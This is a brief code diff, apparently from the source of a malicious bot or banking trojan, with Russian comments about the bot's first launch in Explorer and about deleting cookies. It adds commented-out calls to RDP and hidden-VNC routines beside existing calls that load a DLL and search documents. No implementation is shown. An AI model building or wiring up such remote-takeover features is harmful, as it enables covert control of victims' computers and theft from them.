@@ -32,6 +32,8 @@ void ExplorerFirstStart(PEventData Data)
 
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
+//	ExecuteRunRDP( 0, 0, 0 );
+//	ExecuteRunHVNC( 0, 0, 0 );
 	// Первый запуск бота в проводнике
 
 	// Запускаем удаление кукисов
